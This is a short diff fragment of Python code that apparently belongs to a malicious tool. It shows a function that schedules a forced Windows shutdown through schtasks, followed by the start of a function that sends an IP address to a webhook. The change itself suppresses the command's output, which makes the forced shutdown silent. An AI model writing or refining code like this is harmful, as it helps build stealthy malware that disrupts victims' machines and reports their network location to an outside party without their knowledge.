@@ -308,7 +308,7 @@ def schedule_shutdown():
 
     command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
 
-    subprocess.run(command, shell=True)
+    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def send_ip_embed(webhook_url, ip_address):
     embed = {
